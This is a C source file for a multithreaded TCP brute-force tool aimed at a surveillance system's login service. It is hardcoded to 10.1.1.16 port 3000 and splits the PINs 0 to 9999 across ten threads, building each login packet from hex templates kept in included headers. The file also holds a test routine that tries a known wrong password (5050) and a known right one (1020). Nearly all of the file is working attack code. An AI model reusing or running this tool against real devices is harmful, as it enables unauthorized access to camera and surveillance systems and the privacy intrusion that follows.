/******************************************************************************
*  @file tcp_brute.c
*  @brief tcp_brute: Generic Network Brute-force
*  @version 2.0.2
*  @author Ara Khachatryan 
******************************************************************************/

#include <stdbool.h> /* for supporting bool type */
#include <stdio.h> /* standard input/output library, for perror() */
#include <stdlib.h> /* dynamic memory management, for calloc() */
#include <string.h> /* functions for manipulating strings, for memcpy() */
#include <errno.h> /* for errno error codes in linux */

#include <pthread.h>

/******************************************************************************
* @brief include all the data from hex_data.h header file that will be used in 
*        Surviliance system bruteforce
* type: static unsigned char 
* login_data_NULL[116] - login message with NULL password
* login_data_1020[116] - login message with 1020 password
* login_data_5050[116] - login message with 5050 password
* COMMAND_LOGIN_FAIL[18] - keyword send from target in case of wrong password
* admin[5] - login name within login message
******************************************************************************/
#include "hex_data.h"

#define IP_ADDRESS "10.1.1.16"
#define PORT_NUMBER 3000
#define DEBUG_MODE true
#define NUM_THREADS 10
#define PASSWD_RANGE_START 0
#define PASSWD_RANGE_END 9999

/*****************
* included headers --->>
*****************/
#include "print_hex_data.h" /* function for printing login data in terminal */
#include "repl_hex_data.h" /* function for setting password in login data */
#include "tcp_login.h" /* core bruteforce function: tcp_login() */
#include "loadBar.h" /* loading bar on terminal: loadBar(), loadBar_fast() */


/* create thread argument struct for bruteforce_thread() */
typedef struct _thread_data_t {
	int  thread_id;
	unsigned long int t_passwd;
	unsigned long int t_pw_range_end;
} thread_data_t;


void tcp_login_test();
void init_thread_args( thread_data_t* t_data );
void thread_debug_msg( char* FCN_msg, int threadID, unsigned long int pw );
void* bruteforce_thread( void* thread_arg );



int main( )
{
	/* test an tcp_login() function for false and true passwords */
	tcp_login_test();

	int i;
	int rc;

	/* declare a pthread_t thread descriptor array */
	pthread_t thread[NUM_THREADS]; 
	/* declare a thread_data_t argument array */
	thread_data_t t_data[NUM_THREADS];
	/* initialize thread arguments array */
	init_thread_args( t_data );	
	
	/* Initialize thread attribute and set thread joinable */
	pthread_attr_t attr;
	pthread_attr_init(&attr);
	pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
	
	/* create threads */
	for ( i = 0; i < NUM_THREADS; ++i ) {
		rc = pthread_create(&thread[i], &attr, bruteforce_thread, &t_data[i]);
		if ( rc ) {
			fprintf(stderr, "error: pthread_create, rc: %d\n", rc);
			return EXIT_FAILURE;
		}
	}
		
	/* free attribute and wait for the other threads */
	pthread_attr_destroy(&attr);
	
	pthread_exit(NULL);

	return 0;
}



void init_thread_args( thread_data_t* t_data )
{
	int i;	
	unsigned long int segment = PASSWD_RANGE_START;
	
	for ( i = 0; i < NUM_THREADS; ++i ) {	
		t_data[i].thread_id = i;
		t_data[i].t_passwd = segment;
		segment += (PASSWD_RANGE_END - PASSWD_RANGE_START)/NUM_THREADS;
		if( i == NUM_THREADS ){
			t_data[i].t_pw_range_end = PASSWD_RANGE_END;
		} else {
			t_data[i].t_pw_range_end = segment;
		}		
		++segment;
	}
}



void* bruteforce_thread( void* thread_arg )
{

	thread_data_t* t_data = (thread_data_t*)thread_arg;
	short int threadID = t_data->thread_id;
	unsigned long int pw = 0;
	
	// print thread_id for debugging purpose
	printf("Thread %d is strarting\n", t_data->thread_id);
	int count_loop = 0;

	for ( pw = t_data->t_passwd; pw <= t_data->t_pw_range_end; pw++ ) {

		// print thread loop for debuginng purpose
//		printf("Loop %d from thread %d is strarting\n", count_loop, t_data->thread_id);
		++count_loop;

		/*****************************************************************
		* initialize login_data with NULLs, copy login_data_NULL's
		* information to the login_data, then set current password 
		*****************************************************************/
		unsigned char *login_data;
		login_data = (unsigned char *)calloc(sizeof(login_data_NULL),
		                                     sizeof(unsigned char));
		memcpy(login_data, login_data_NULL, sizeof(login_data_NULL));
		repl_hex_data(login_data, pw);
		
		char *FCN_msg = NULL;
		short int result;
		
		if ( DEBUG_MODE ) {
			FCN_msg = (char *)calloc(111, sizeof(char));
			result = tcp_login( login_data, FCN_msg );
//			loadBar_msg( pw, PASSWD_RANGE_END, 50, FCN_msg );
			thread_debug_msg(FCN_msg, threadID, pw);
			free(FCN_msg);
		} else {
			result = tcp_login( login_data, FCN_msg );
			loadBar_fast( pw, PASSWD_RANGE_END, 1000, 50 );
		}
		
		free(login_data);
		
		if ( result >= 1 ) {
			break;
		}
	
	}
	
	pthread_exit(NULL);

}



void thread_debug_msg( char* FCN_msg, int threadID, unsigned long int pw )
{
	printf("TID ");
	printf("\x1B[1;32m"); /* make text bold and set to green color */
	printf("%-3d ", threadID);
	printf("\x1B[0m"); /* reset all text attributes via ASCII code */
	printf("PW ");
	printf("\x1B[1;33m"); /* make text bold and set to yellow color */
	printf("%-6ld ", pw);
	printf("\x1B[0m"); /* reset all text attributes via ASCII code */

	printf("%s\n",  FCN_msg);
	
	fflush(stdout); /* flush the buffer to the stdout stream immediately */
}



void tcp_login_test()
{
	/**********************************************************************
	* probe for false "5050" and true "1020" passwords --->>
	**********************************************************************/
	char FCN_test_msg[111];
	
	printf("\x1B[2J"); /* clear the terminal screen */
	printf("\x1B[0;0H"); /* move cursor to the 0;0 position of termial */

	printf("\nLogin raw data with false password: 5050 --->>\n");	
	print_hex_data( login_data_5050, sizeof(login_data_5050) );
	memset(FCN_test_msg, 0x00, sizeof(FCN_test_msg));
	tcp_login( login_data_5050, FCN_test_msg );
	printf("tcp_login() -> %s\n", FCN_test_msg);
	sleep(2);

	printf("\nLogin raw data with true password: 1020 --->>\n");	
	print_hex_data( login_data_1020, sizeof(login_data_1020) );
	memset(FCN_test_msg, 0x00, sizeof(FCN_test_msg));
	tcp_login( login_data_1020, FCN_test_msg );
	printf("tcp_login() -> %s\n", FCN_test_msg);
	sleep(2); 
	
	printf("\n");
}
